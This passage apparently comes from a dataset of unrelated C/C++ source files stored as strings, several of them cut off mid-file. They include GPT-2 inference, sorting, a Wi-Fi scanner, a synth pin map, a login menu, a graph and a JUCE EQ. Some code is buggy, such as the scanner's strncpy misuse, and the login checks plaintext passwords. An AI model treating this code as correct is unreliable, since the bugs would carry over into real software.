corresponding vocab indices.\n        torch::Tensor xcols = top_k_indices.gather(/*dim=*/1, /*index=*/idx);\n\n        // Append to the sequence\n        // (B, T) => (B, T + 1)\n        tokens = torch::cat({tokens, xcols}, /*dim=*/1);\n    }\n\n\n    tokens = tokens.cpu();\n    std::vector<std::vector<uint64_t>> generated_tokens(num_return_sequences, std::vector<uint64_t>(max_generation_length));\n    for(size_t i=0; i<num_return_sequences; ++i){\n        for(size_t j=0; j<max_generation_length; ++j){\n            generated_tokens[i][j] = static_cast<uint64_t>(tokens[i][j].item<int64_t>());\n        }\n    }\n    return generated_tokens;\n}\n\n\nvoid GPT_playground(const std::string& input_string, \n                    const std::string& tiktoken_conf, \n                    const int target_sequence_length, \n                    const int num_output_variants,\n                    const std::string& gpt_model){\n\n    // Instantiate tiktoken tokenizer.\n    tokenizer::tiktoken tokenizer(tiktoken_conf);\n    \n    // Encode the input language string to tiktoken encodings.\n    std::vector<int64_t> tokens = tokenizer.encode(input_string);\n\n    // Identify if GPU is available.\n    torch::DeviceType device_type = torch::cuda::is_available() ? torch::kCUDA : torch::kCPU;\n    torch::Device run_device(device_type);\n    std::cout<<\"[INFO]  Running on \"<<device_type<<std::endl;\n\n    // Construct the GPT2 model.\n    std::unique_ptr<GPTConfig> config{nullptr};\n\n    if(gpt_model == \"gpt2\"){\n        config = std::make_unique<GPTConfig>(1024, 50257, 12, 12, 768); // 124M params\n        std::cout<<\"[INFO]  GPT2 model config generated.\"<<std::endl;\n    } else if (gpt_model == \"gpt2-medium\"){\n        config = std::make_unique<GPTConfig>(1024, 50257, 24, 16, 1024); // 350M params\n        std::cout<<\"[INFO]  GPT2-medium model config generated.\"<<std::endl;\n    } else if (gpt_model == \"gpt2-large\"){\n        config = std::make_unique<GPTConfig>(1024, 50257, 36, 20, 1280); // 774M params\n        std::cout<<\"[INFO]  GPT2-large model config generated.\"<<std::endl;\n    } else if (gpt_model == \"gpt2-xl\"){\n        config = std::make_unique<GPTConfig>(1024, 50257, 48, 25, 1600); // 1.558B params\n        std::cout<<\"[INFO]  GPT2-xl model config generated.\"<<std::endl;\n    } else{\n        throw std::invalid_argument(gpt_model+\" does not exist. Try one of [gpt2, gpt2-medium, gpt2-large, gpt2-xl]\");\n    }\n\n    GPT model(*config);\n    model.to(run_device);\n\n    // Load the pretrained weights.\n    // I will update this logic to load weights that are custom trained.\n    pretrained::load_from_pretrained_GPT2_HF(model, \"../data/gpt2_weights.pt\");\n\n    // GPT2 model inference\n    std::vector<std::vector<uint64_t>> generated_tokens = model.inference(tokens, num_output_variants, target_sequence_length, run_device);\n\n    // Decode the generated tokens, and print the outputs.\n    std::cout<<\"_________________________________________",
    "#include <vector>\n#include <iostream>\n\nusing std::cout;\nusing std::endl;\n\nvoid mergeSort(std::vector<u_int64_t> &array, u_int64_t start, u_int64_t end)\n{\n    if(end - start < 2)\n    {\n        return;\n    }\n\n    u_int64_t middle = (start + end) / 2;\n    mergeSort(array, start, middle);\n    mergeSort(array, middle, end);\n\n    std::vector<u_int64_t> resArr(end - start);\n    u_int64_t left = start;\n    u_int64_t right = middle;\n    u_int64_t index = 0;\n\n    while(left < middle && right < end)\n    {\n        if(array[left] <= array[right])\n        {\n            resArr[index++] = array[left++];\n        }\n        else\n        {\n            resArr[index++] = array[right++];\n        }\n    }\n\n    while(left < middle)\n    {\n        resArr[index++] = array[left++];\n    }\n\n    while(right < end)\n    {\n        resArr[index++] = array[right++];\n    }\n\n    u_int64_t n = 0;\n    u_int64_t *p = &array[n];\n    for([[maybe_unused]] const auto &v: resArr)\n    {\n        std::copy(resArr.begin(), resArr.end(), p + start);\n        n++;\n    }\n}\n\nint main()\n{\n    std::vector<u_int64_t> nums = {9, 4, 13, 7, 1, 28, 3, 5, 10, 11};\n    cout << \"Array before sorting: \";\n    for(const auto &val : nums)\n    {\n        cout << val << \" \";\n    }\n    cout << endl;\n\n    mergeSort(nums, 0, nums.size());\n    cout << \"Array after sorting: \";\n    for(const auto &val : nums)\n    {\n        cout << val << \" \";\n    }\n    cout << endl;\n\n    return EXIT_SUCCESS;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <arpa/inet.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <sys/ioctl.h>\n#include <net/if.h>\n#include <errno.h>\n\n#define MAX_PACKET_SIZE 8192\n\n// Structure to hold information about Wi-Fi networks\nstruct wifi_network {\n    char ssid[32];\n    char bssid[18];\n    int channel;\n    int signal_strength;\n};\n\n// Function to scan for Wi-Fi networks and print basic information\nvoid scan_wifi_networks() {\n    int sock;\n    struct iwreq wreq;\n    char buffer[MAX_PACKET_SIZE];\n    struct wifi_network networks[10]; // Assuming we can find up to 10 networks\n\n    // Open a socket for wireless operations\n    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {\n        perror(\"Socket creation failed\");\n        return;\n    }\n\n\n    memset(&wreq, 0, sizeof(struct iwreq));\n    wreq.u.data.pointer = buffer;\n    wreq.u.data.length = MAX_PACKET_SIZE;\n    strcpy(wreq.ifr_name, \"wlan0\"); // Replace with your Wi-Fi interface name\n\n    // Perform scan operation\n    if (ioctl(sock, SIOCSIWSCAN, &wreq) < 0) {\n        perror(\"Scan request failed\");\n        close(sock);\n        return;\n    }\n\n    // Read scan results\n    if (ioctl(sock, SIOCGIWSCAN, &wreq) < 0) {\n        perror(\"Reading scan results failed\");\n        close(sock);\n        return;\n    }\n\n    close(sock);\n\n    // Parse and print scan results\n    struct iw_event *event = (struct iw_event *) buffer;\n    int num_networks = 0;\n\n    while ((char *) event < buffer + wreq.u.data.length) {\n        if (event->cmd == SIOCGIWAP) {\n            struct wifi_network *net = &networks[num_networks];\n\n            // Copy BSSID\n            sprintf(net->bssid, \"%02X:%02X:%02X:%02X:%02X:%02X\",\n                    event->u.ap_addr.sa_data[0], event->u.ap_addr.sa_data[1],\n                    event->u.ap_addr.sa_data[2], event->u.ap_addr.sa_data[3],\n                    event->u.ap_addr.sa_data[4], event->u.ap_addr.sa_data[5]);\n\n            // Copy SSID\n            strncpy(net->ssid, (char *) event + IW_EV_POINT_LEN, event->u.essid.pointer);\n            net->ssid[event->u.essid.pointer] = '\\0';\n\n            // Other information such as channel and signal strength can be obtained similarly\n            // For simplicity, we assume channel and signal strength are set manually\n            net->channel = 1; // Example value, actual channel information needs more parsing\n            net->signal_strength = 70; // Example value, actual signal strength needs more parsing\n\n            num_networks++;\n        }\n\n        // Move to the next event in buffer\n        event = (struct iw_event *) ((char *) event + event->len);\n    }\n\n    // Print scan results\n    printf(\"Wi-Fi Networks Found:\\n\");\n    for (int i = 0; i < num_networks; i++) {\n        printf(\"SSID: %s, BSSID: %s, Channel: %d, Signal Strength: %d%%\\n\",\n               networks[i].ssid, networks[i].bssid, networks[i].channel, networks[i].signal_strength);\n    }\n}\n\nint main() {\n    scan_wifi_networks();\n    return 0;\n}\n",
    "#include \"time_machine_hardware.h\"\n#include <vector>\n\nnamespace oam\n{\nnamespace time_machine\n{\n    /** Const definitions */\n    static constexpr dsy_gpio_pin DUMMYPIN        = {DSY_GPIOX, 0};\n    static constexpr dsy_gpio_pin PIN_ADC_CTRL_1  = {DSY_GPIOA, 3};\n    static constexpr dsy_gpio_pin PIN_ADC_CTRL_2  = {DSY_GPIOA, 6};\n    static constexpr dsy_gpio_pin PIN_ADC_CTRL_3  = {DSY_GPIOA, 2};\n    static constexpr dsy_gpio_pin PIN_ADC_CTRL_4  = {DSY_GPIOA, 7};\n    static constexpr dsy_gpio_pin PIN_ADC_CTRL_5  = {DSY_GPIOB, 1};\n    static constexpr dsy_gpio_pin PIN_ADC_CTRL_6  = {DSY_GPIOC, 4};\n    static constexpr dsy_gpio_pin PIN_ADC_CTRL_7  = {DSY_GPIOC, 0};\n    static constexpr dsy_gpio_pin PIN_ADC_CTRL_8  = {DSY_GPIOC, 1};\n    static constexpr dsy_gpio_pin PIN_ADC_CTRL_9  = {DSY_GPIOA, 1};\n    static constexpr dsy_gpio_pin PIN_ADC_CTRL_10 = {DSY_GPIOA, 0};\n    static constexpr dsy_gpio_pin PIN_ADC_CTRL_11 = {DSY_GPIOC, 2};\n    static constexpr dsy_gpio_pin PIN_ADC_CTRL_12 = {DSY_GPIOC, 3};\n    static constexpr dsy_gpio_pin PIN_USER_LED    = {DSY_GPIOC, 7};\n\n    const dsy_gpio_pin kPinMap[4][10] = {\n        /** Header Bank A */\n        {\n            DUMMYPIN,        /**< A1  - -12V Power Input */\n            {DSY_GPIOA, 1},  /**< A2  - UART1 Rx */\n            {DSY_GPIOA, 0},  /**< A3  - UART1 Tx */\n            DUMMYPIN,        /**< A4  - GND */\n            DUMMYPIN,        /**< A5  - +12V Power Input */\n            DUMMYPIN,        /**< A6  - +5V Power Output */\n            DUMMYPIN,        /**< A7  - GND */\n            {DSY_GPIOB, 14}, /**< A8  - USB DM */\n            {DSY_GPIOB, 15}, /**< A9  - USB DP */\n            DUMMYPIN,        /**< A10 - +3V3 Power Output */\n        },\n        /** Header Bank B */\n        {\n            DUMMYPIN,        /**< B1  - Audio Out Right */\n            DUMMYPIN,        /**< B2  - Audio Out Left*/\n            DUMMYPIN,        /**< B3  - Audio In Right */\n            DUMMYPIN,        /**< B4  - Audio In Left */\n            {DSY_GPIOC, 13}, /**< B5  - GATE OUT 1 */\n            {DSY_GPIOC, 14}, /**< B6  - GATE OUT 2 */\n            {DSY_GPIOB, 8},  /**< B7  - I2C1 SCL */\n            {DSY_GPIOB, 9},  /**< B8  - I2C1 SDA */\n            {DSY_GPIOG, 14}, /**< B9  - GATE IN 2 */\n            {DSY_GPIOG, 13}, /**< B10 - GATE IN 1 */\n        },\n        /** Header Bank C */\n        {\n            {DSY_GPIOA, 5}, /**< C1  - CV Out 2 */\n            PIN_ADC_CTRL_4, /**< C2  - CV In 4 */\n            PIN_ADC_CTRL_3, /**< C3  - CV In 3 */\n            PIN_ADC_CTRL_2, /**< C4  - CV In 2 */\n            PIN_ADC_CTRL_1, /**< C5  - CV In 1 */\n            PIN_ADC_CTRL_5, /**< C6  - CV In 5 */\n            PIN_ADC_CTRL_6, /**< C7  - CV In 6 */\n            PIN_ADC_CTRL_7, /**< C8  - CV In 7 */\n            PIN_ADC_CTRL_8, /**< C9  - CV In 8 */\n            {DSY_GPIOA, 4}, /**< C10 - CV Out 1 */\n        },\n        /** Header Bank D */\n        {\n            {DSY_GPIOB, 4},  /**< D1  - SPI2 CS */\n            {DSY_GPIOC, 11}, /**< D2  - SDMMC D3 */\n            {DSY_GPIOC, 10}, /**< D3  - SDMMC D2*/\n            {DSY_GPIOC, 9},  /**< D4  - SDMMC D1*/\n            {DSY_GPIOC, 8},  /**< D5  - SDMMC D0 */\n            {DSY_GPIOC, 12}, /**< D6  - SDMMC CK */\n            {DSY_GPIOD, 2},  /**< D7  - SDMMC CMD */\n            {DSY_GPIOC, 2},  /**< D8  - SPI2 MISO */\n            {DSY_GPIOC, 3},  /**< D9  - SPI2 MOSI */\n            {DSY_GPIOD, 3},  /**< D10 - SPI2 SCK  */\n        },\n    };\n\n    const dsy_gpio_pin TimeMachineHardware::A1  = kPinMap[0][0];\n    const dsy_gpio_pin TimeMachineHardware::A2  = kPinMap[0][1];\n    const dsy_gpio_pin TimeMachineHardware::A3  = kPinMap[0][2];\n    const dsy_gpio_pin TimeMachineHardware::A4  = kPinMap[0][3];\n    const dsy_gpio_pin TimeMachineHardware::A5  = kPinMap[0][4];\n    const dsy_gpio_pin TimeMachineHardware::A6  = kPinMap[0][5];\n    const dsy_gpio_pin TimeMachineHardware::A7  = kPinMap[0][6];\n    const dsy_gpio_pin TimeMachineHardware::A8  = kPinMap[0][7];\n    const dsy_gpio_pin TimeMachineHardware::A9  = kPinMap[0][8];\n    const dsy_gpio_pin TimeMachineHardware::A10 = kPinMap[0][9];\n    const dsy_gpio_pin TimeMachineHardware::B1  = kPinMap[1][0];\n    const dsy_gpio_pin TimeMachineHardware::B2  = kPinMap[1][1];\n    const dsy_gpio_pin TimeMachineHardware::B3  = kPinMap[1][2];\n    const dsy_gpio_pin TimeMachineHardware::B4  = kPinMap[1][3];\n    const dsy_gpio_pin TimeMachineHardware::B5  = kPinMap[1][4];\n    const dsy_gpio_pin TimeMachineHardware::B6  = kPinMap[1][5];\n    const dsy_gpio_pin TimeMachineHardware::B7  = kPinMap[1][6];\n    const dsy_gpio_pin TimeMachineHardware::B8  = kPinMap[1][7];\n    const dsy_gpio_pin TimeMachineHardware::B9  = kPinMap[1][8];\n    const dsy_gpio_pin TimeMachineHardware::B10 = kPinMap[1][9];\n    const dsy_gpio_pin TimeMachineHardware::C1  = kPinMap[2][0];\n    const dsy_gpio_pin TimeMachineHardware::C2  = kPinMap[2][1];\n    const dsy_gpio_pin TimeMachineHardware::C3  = kPinMap[2][2];\n    const dsy_gpio_pin TimeMachineHardware::C4  = kPinMap[2][3];\n  ",
    "#include \"iostream\"\n#include \"identity.h\"\n#include \"fstream\"\n#include \"string\"\n#include \"globalFile.h\"\n#include \"student.h\"\n#include \"teacher.h\"\n#include \"manager.h\"\n\nusing namespace std;\n\n//\u8fdb\u5165\u5b66\u751f\u5b50\u83dc\u5355\u754c\u9762\nvoid studentMenu(identity *&student) {\n    while (true) {\n        //\u8c03\u7528\u5b66\u751f\u5b50\u83dc\u5355\n        student->openMenu();\n        Student *stu = (Student *) student;\n        int select = 0;\n        cin >> select;//\u63a5\u53d7\u7528\u6237\u9009\u62e9\n        if (select == 1) { //\u7533\u8bf7\u9884\u7ea6\n            stu->applyOrder();\n        } else if (select == 2) { //\u67e5\u770b\u81ea\u8eab\u9884\u7ea6\n            stu->showMyOrder();\n        } else if (select == 3) { //\u67e5\u770b\u6240\u6709\u4eba\u9884\u7ea6\n            stu->showAllOrder();\n        } else if (select == 4) { //\u53d6\u6d88\n            stu->cancelOrder();\n        } else {\n            //\u6ce8\u9500\n            delete student;\n            cout << \"\u6ce8\u9500\u6210\u529f\" << endl;\n            system(\"read\");\n            system(\"clear\");\n            return;\n        }\n    }\n}\n\n//\u8fdb\u5165\u6559\u5e08\u5b50\u83dc\u5355\nvoid teacherMenu(identity *&teacher) {\n    while (true) {\n        //\u8c03\u7528\u5b50\u83dc\u5355\n        teacher->openMenu();\n        Teacher *tea = (Teacher *) teacher;\n        int select = 0;//\u63a5\u53d7\u7528\u6237\u9009\u62e9\n        cin >> select;\n        if (select == 1) { //\u67e5\u770b\u6240\u6709\u9884\u7ea6\n            tea->showAllOrder();\n        } else if (select == 2) { //\u5ba1\u6838\u9884\u7ea6\n            tea->validOrder();\n        } else {\n            delete teacher;\n            cout << \"\u6ce8\u9500\u6210\u529f\" << endl;\n            system(\"read\");\n            system(\"clear\");\n        }\n    }\n}\n\n//\u8fdb\u5165\u7ba1\u7406\u5458\u5b50\u83dc\u5355\nvoid managerMenu(identity *&manager) {\n    while (true) {\n        //\u8c03\u7528\u7ba1\u7406\u5458\u5b50\u83dc\u5355\n        manager->openMenu();\n        //\u5c06\u7236\u7c7b\u6307\u9488\u8f6c\u4e3a\u5b50\u7c7b\u6307\u9488,\u8c03\u7528\u5b50\u7c7b\u91cc\u5176\u4ed6\u63a5\u53e3\n        Manager *man = dynamic_cast<Manager *>(manager);\n        if (man == nullptr) {\n            cerr << \"\u7c7b\u578b\u8f6c\u6362\u5931\u8d25\" << endl;\n            return;\n        }\n        int select = 0;\n        //\u63a5\u53d7\u7528\u6237\u7684\u9009\u62e9\n        cin >> select;\n        if (select == 1) { //\u6dfb\u52a0\u8d26\u53f7\n            cout << \"\u6dfb\u52a0\u8d26\u53f7\" << endl;\n            man->addPerson();\n        } else if (select == 2) { //\u67e5\u770b\u8d26\u53f7\n            cout << \"\u67e5\u770b\u8d26\u53f7\" << endl;\n            man->showPerson();\n        } else if (select == 3) { //\u67e5\u770b\u673a\u623f\u4fe1\u606f\n            cout << \"\u67e5\u770b\u673a\u623f\" << endl;\n            man->showComputer();\n        } else if (select == 4) {//\u6e05\u7a7a\n            cout << \"\u6e05\u7a7a\u9884\u7ea6\" << endl;\n            man->cleanFile();\n        } else {\n            delete manager; //\u9500\u6bc1\u6389\u5806\u533a\u5bf9\u8c61\n            cout << \"\u6ce8\u9500\u6210\u529f\" << endl;\n            system(\"clear\");\n            return;\n        }\n    }\n}\n\n//\u767b\u9646\u529f\u80fd\nvoid LoginIn(string fileName, int type) //\u53c2\u65701 \u64cd\u4f5c\u6587\u4ef6\u540d \u53c2\u6570 2 \u64cd\u4f5c\u8eab\u4efd\u7c7b\u578b\n{\n    identity *person = NULL;  //\u7236\u7c7b\u6307\u9488,\u7528\u4e8e\u6307\u5411\u5b50\u7c7b\u5bf9\u8c61\n    //\u8bfb\u6587\u4ef6\n    ifstream ifs; //\u6587\u4ef6\u64cd\u4f5c\n    ifs.open(fileName, ios::in);\n    //\u5224\u65ad\u6587\u4ef6\u662f\u5426\u5b58\u5728\n    if (!ifs.is_open()) {\n        cout << \"\u6587\u4ef6\u4e0d\u5b58\u5728\" << endl;\n        ifs.close();\n        return;\n    }\n    //\u51c6\u5907\u63a5\u53d7\u7528\u6237\u4fe1\u606f\n    int id = 0;\n    string name;\n    string pwd;\n    //\u5224\u65ad\u8eab\u4efd\n    if (type == 1) { //\u5b66\u751f\n        cout << \"\u8bf7\u8f93\u5165\u4f60\u7684\u5b66\u53f7:\" << endl;\n        cin >> id;\n    } else if (type == 2) {\n        cout << \"\u8bf7\u8f93\u5165\u60a8\u7684\u804c\u5de5\u53f7\" << endl;\n        cin >> id;\n    }\n    cout << \"\u8bf7\u8f93\u5165username:\" << endl;\n    cin >> name;\n    cout << \"\u8bf7\u8f93\u5165\u5bc6\u7801:\" << endl;\n    cin >> pwd;\n\n    if (type == 1) {\n        //\u5b66\u751f\u8eab\u4efd\u9a8c\u8bc1\n        int fId;//\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u7684ID\n        string fName;//\u4ece\u6587\u4ef6\u4e2d\u83b7\u53d6\u59d3\u540d\n        string fPwd;//\u6587\u4ef6\u5bc6\u7801\n        while (ifs >> fId && ifs >> fName && ifs >> fPwd) {\n            if (fId == id && fName == name && fPwd == pwd) { //\u9a8c\u8bc11\n                cout << \"student login success\" << endl;\n                system(\"clear\");\n                person = new Student(id, name, pwd);\n                //student _child menu\n                //\u8fdb\u5165\u5b66\u751f\u8eab\u4efd\u5b50\u83dc\u5355\n                studentMenu(person);\n                return;\n            }\n        }\n    } else if (type == 2) {\n        //\u6559\u5e08\n        int fId;//\u4ece\u6587\u4ef6\u4e2d\u8bfb\u53d6\u7684ID\n        string fName;//\u4ece\u6587\u4ef6\u4e2d\u83b7\u53d6\u59d3\u540d\n        string fPwd;//\u6587\u4ef6\u5bc6\u7801\n        while (ifs >> fId && ifs >> fName && ifs >> fPwd) {\n            if (fId == id && fName == name && fPwd == pwd) { //\u9a8c\u8bc11\n                cout << \"teacher login success\" << endl;\n                system(\"clear\");\n                person = new Teacher(id, name, pwd);\n                //student _child menu\n                teacherMenu(person);\n                return;\n            }\n        }\n    } else if (type == 3) {\n        //\u7ba1\u7406\u5458\u8eab\u4efd\n        string fName; //\u4ece\u6587\u4ef6\u4e2d\u83b7\u53d6\u7684\u59d3\u540d\n        string fPwd; //\u4ece\u6587\u4ef6\u4e2d\u83b7\u53d6\u7684\u5bc6\u7801\n        while (ifs >> fName && ifs >> fPwd) {\n            if (name == fName && pwd == fPwd) {\n                cout << \"manager login success\" << endl;\n                system(\"clear\");\n                person = new Manager(name, pwd);\n                //\u8fdb\u5165\u7ba1\u7406\u5b50\u83dc\u5355\u754c\u9762#\n                managerMenu(person);\n                return;\n            }\n        }\n    }\n    cout << \"\u9a8c\u8bc1\u767b\u9646\u5931\u8d25!\" << endl;\n    system(\"clear\");\n    return;\n}\n\nint main() {\n    int select = 0; //\u7528\u4e8e\u63a5\u53d7\u7528\u6237\u7684\u9009\u62e9\n    while (true) {\n        cout << \"===============\u6b22\u8fce\u6765\u5230\u738b\u724c\u98de\u884c\u5458\u5927\u5b66\u9884\u7ea6\u7cfb\u7edf==+++==+++====+++====++\" << endl;\n        cout << \"\\t\\t------------------------\\n\";\n        cout << \"\\t\\t|                       |\\n\";\n        cout << \"\\t\\t|          1.\u5b66\u751f\u4ee3\u8868    |\\n\";\n        cout << \"\\t\\t|                       |\\n\";\n        cout << \"\\t\\t|          2.\u8001\u5e08        |\\n\";\n        c",
    "#include <iostream>\r\n#include <cstdio>\r\n#include <unordered_map>\r\n#include <utility> \r\n#include <functional>\r\n#include <map>\r\n#include <cmath>\r\n#include <queue>\r\n#include <limits>\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\n\r\ndouble distance(pair<float,float> &a,pair<float,float> &b){\r\n    return sqrt((a.first - b.first)*(a.first - b.first) + (a.second - b.second)*(a.second - b.second));\r\n}\r\n\r\n\r\nclass Graph{\r\n   \r\n    private:\r\n\r\n        struct CompareEdge {\r\n            bool operator()(const pair<unsigned int,double>& e1, const pair<unsigned int,double>& e2) {\r\n                return e1.second > e2.second; \r\n            }\r\n        };\r\n        \r\n        static vector<pair<float,float>> coordinates_map;\r\n\r\n        struct PairComparator {\r\n            bool operator()(const pair<unsigned int, unsigned int>& a, const pair<unsigned int, unsigned int>& b) const {\r\n                \r\n                    return distance(Graph::coordinates_map[a.first],Graph::coordinates_map[a.second]) < distance(Graph::coordinates_map[b.first],Graph::coordinates_map[b.second]);\r\n                \r\n            }\r\n        };\r\n\r\n        vector<map<pair<unsigned int,unsigned int>,double,PairComparator>> Adjlist;\r\n\r\n        void DFS_helper(unsigned int id,vector<bool> &visited){\r\n            visited[id] = true;\r\n            cout << id << \" \";\r\n\r\n            for ( auto& pair : Adjlist[id]) {\r\n                if(visited[pair.first.second])continue;\r\n                DFS_helper(pair.first.second,visited);\r\n            }\r\n\r\n        }\r\n\r\n    public:\r\n\r\n        float Connectivity_Range;\r\n\r\n        void addvertex(float x,float y){\r\n            coordinates_map.push_back(pair<float,float>(x,y));\r\n            Adjlist.push_back({});\r\n        }\r\n        \r\n        void addedge(unsigned int a, unsigned int b){\r\n\r\n            pair<unsigned int,unsigned int> temp1(a,b);\r\n            pair<unsigned int,unsigned int> temp2(b,a);\r\n\r\n            Adjlist[a][temp1] = distance(coordinates_map[a],coordinates_map[b]);\r\n            Adjlist[b][temp2] = distance(coordinates_map[a],coordinates_map[b]);\r\n\r\n\r\n        }\r\n\r\n        void build_Graph_based_on_Connectivity(){\r\n            size_t capacity = coordinates_map.size();\r\n            vector<bool> temp(capacity);\r\n\r\n            for(int id1=0;id1<capacity;id1++){\r\n                temp[id1] = true;\r\n                for(int id2=0;id2<capacity;id2++){\r\n                    if(id1 == id2)continue;\r\n                    if(temp[id2])continue;\r\n                    if(check_connectivity(id1,id2))addedge(id1,id2);\r\n\r\n                }\r\n            }\r\n        }\r\n\r\n        bool check_connectivity(unsigned int a,unsigned int b){\r\n            return distance(coordinates_map[a],coordinates_map[b]) < Connectivity_Range;\r\n        }\r\n\r\n        void parseinput(){\r\n\r\n            size_t capacity;\r\n            scanf(\"%zu\",&capacity);\r\n            scanf(\"%f\",&Connectivity_Range);\r\n            for (size_t i = 0; i < capacity; i++){\r\n                float a;\r\n                float b;\r\n                scanf(\"%f%f\",&a,&b);\r\n                addvertex(a,b);\r\n            }\r\n            \r\n\r\n        }\r\n\r\n        void diplay_edges(){\r\n            size_t capacity = coordinates_map.size();\r\n\r\n            for(int id1=0;id1<capacity;id1++){\r\n\r\n                for ( auto& pair : Adjlist[id1]) {\r\n                    printf(\"(%d, %d, %.3g)\\n\",pair.first.first,pair.first.second,pair.second);\r\n                }\r\n            }\r\n        }\r\n        \r\n        void diplay_Adj_vehicules(unsigned int id){\r\n            size_t capacity = coordinates_map.size();\r\n            if (id >= capacity)return;\r\n\r\n\r\n            for ( auto& pair : Adjlist[id]) {\r\n                printf(\"\\n(%d, %.3g)\\n\",pair.first.second,pair.second);\r\n            }\r\n            \r\n        }\r\n\r\n        void move_vehicule(unsigned int id, float x, float y){\r\n\r\n            size_t capacity = coordinates_map.size();\r\n            if(id>= capacity)return;\r\n\r\n\r\n            coordinates_map[id] = pair<float,float>(x,y);\r\n\r\n            for ( auto& pair : Adjlist[id]) {\r\n                Adjlist[pair.first.second].erase({pair.first.second,pair.first.first});\r\n            }\r\n            \r\n            Adjlist[id].clear();\r\n\r\n            for(int id2=0;id2<capacity;id2++){\r\n                    if(id == id2)continue;\r\n                    if(check_connectivity(id,id2))addedge(id,id2);\r\n\r\n            }\r\n\r\n\r\n\r\n        }\r\n\r\n        void DFS(unsigned int id){\r\n\r\n            size_t capacity = coordinates_map.size();\r\n            if(id >=capacity)return;\r\n\r\n            vector<bool> visited(capacity,false);\r\n\r\n            DFS_helper(id,visited);\r\n            cout << \"\\n\";\r\n\r\n        }\r\n\r\n        void BFS(unsigned int id){\r\n            size_t capacity = coordinates_map.size();\r\n            if(id >=capacity)return;\r\n\r\n            vector<bool> visited(capacity,false);\r\n            queue<unsigned int> Queue;\r\n\r\n            Queue.push(id);\r\n            visited[id] = true;\r\n\r\n            while(!Queue.empty()){\r\n                unsigned int fr",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nusing i8 = int8_t;\nusing i16 = int16_t;\nusing i32 = int32_t;\nusing i64 = int64_t;\nusing isize = ptrdiff_t;\nusing u8 = uint8_t;\nusing u16 = uint16_t;\nusing u32 = uint32_t;\nusing u64 = uint64_t;\nusing usize = size_t;\nusing f32 = float_t;\nusing f64 = double_t;\n\ninline constexpr i32 Modulus = 1e9 + 7;\n\nint main(void)\n{\n    ios_base::sync_with_stdio(false);\n    cin.tie(nullptr);\n    cout.tie(nullptr);\n\n    usize n;\n    cin >> n;\n\n    vector<u32> towers;\n    for (usize index = 0; index < n; index += 1)\n    {\n        u32 cube;\n        cin >> cube;\n\n        usize left = 0, right = towers.size();\n        while (left < right)\n        {\n            usize middle = left + (right - left) / 2;\n            if (cube < towers[middle])\n            {\n                right = middle;\n            }\n            else\n            {\n                left = middle + 1;\n            }\n        }\n\n        if (left == towers.size())\n        {\n            towers.push_back(cube);\n        }\n        else\n        {\n            towers[left] = cube;\n        }\n    }\n\n    cout << towers.size();\n\n    return 0;\n}\n",
    "/*\r\n  ==============================================================================\r\n\r\n    This file contains the basic framework code for a JUCE plugin processor.\r\n\r\n  ==============================================================================\r\n*/\r\n\r\n#include \"PluginProcessor.h\"\r\n#include \"PluginEditor.h\"\r\n\r\n//==============================================================================\r\nSimpleEQAudioProcessor::SimpleEQAudioProcessor()\r\n#ifndef JucePlugin_PreferredChannelConfigurations\r\n     : AudioProcessor (BusesProperties()\r\n                     #if ! JucePlugin_IsMidiEffect\r\n                      #if ! JucePlugin_IsSynth\r\n                       .withInput  (\"Input\",  juce::AudioChannelSet::stereo(), true)\r\n                      #endif\r\n                       .withOutput (\"Output\", juce::AudioChannelSet::stereo(), true)\r\n                     #endif\r\n                       )\r\n#endif\r\n{\r\n}\r\n\r\nSimpleEQAudioProcessor::~SimpleEQAudioProcessor()\r\n{\r\n}\r\n\r\n//==============================================================================\r\nconst juce::String SimpleEQAudioProcessor::getName() const\r\n{\r\n    return JucePlugin_Name;\r\n}\r\n\r\nbool SimpleEQAudioProcessor::acceptsMidi() const\r\n{\r\n   #if JucePlugin_WantsMidiInput\r\n    return true;\r\n   #else\r\n    return false;\r\n   #endif\r\n}\r\n\r\nbool SimpleEQAudioProcessor::producesMidi() const\r\n{\r\n   #if JucePlugin_ProducesMidiOutput\r\n    return true;\r\n   #else\r\n    return false;\r\n   #endif\r\n}\r\n\r\nbool SimpleEQAudioProcessor::isMidiEffect() const\r\n{\r\n   #if JucePlugin_IsMidiEffect\r\n    return true;\r\n   #else\r\n    return false;\r\n   #endif\r\n}\r\n\r\ndouble SimpleEQAudioProcessor::getTailLengthSeconds() const\r\n{\r\n    return 0.0;\r\n}\r\n\r\nint SimpleEQAudioProcessor::getNumPrograms()\r\n{\r\n    return 1;   // NB: some hosts don't cope very well if you tell them there are 0 programs,\r\n                // so this should be at least 1, even if you're not really implementing programs.\r\n}\r\n\r\nint SimpleEQAudioProcessor::getCurrentProgram()\r\n{\r\n    return 0;\r\n}\r\n\r\nvoid SimpleEQAudioProcessor::setCurrentProgram (int index)\r\n{\r\n}\r\n\r\nconst juce::String SimpleEQAudioProcessor::getProgramName (int index)\r\n{\r\n    return {};\r\n}\r\n\r\nvoid SimpleEQAudioProcessor::changeProgramName (int index, const juce::String& newName)\r\n{\r\n}\r\n\r\n//==============================================================================\r\nvoid SimpleEQAudioProcessor::prepareToPlay (double sampleRate, int samplesPerBlock)\r\n{\r\n    // Use this method as the place to do any pre-playback\r\n    // initialisation that you need..\r\n    juce::dsp::ProcessSpec spec;\r\n\r\n    spec.maximumBlockSize = samplesPerBlock;\r\n\r\n    spec.numChannels = 1;\r\n\r\n    spec.sampleRate = sampleRate;\r\n\r\n    leftChain.prepare(spec);\r\n    rightChain.prepare(spec);\r\n\r\n    auto chainSettings = getChainSettings(apvts);\r\n\r\n    auto peakCoefficients = juce::dsp::IIR::Coefficients<float>::makePeakFilter(sampleRate,\r\n        \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tchainSettings.peakFreq,\r\n        \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tchainSettings.peakQuality,\r\n        \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tjuce::Decibels::decibelsToGain\r\n                                                                                (chainSettings.peakGainInDecibels));\r\n\r\n    *leftChain.get<ChainPositions::Peak>().coefficients = *peakCoefficients;\r\n    *rightChain.get<ChainPositions::Peak>().coefficients = *peakCoefficients;\r\n}\r\n\r\nvoid 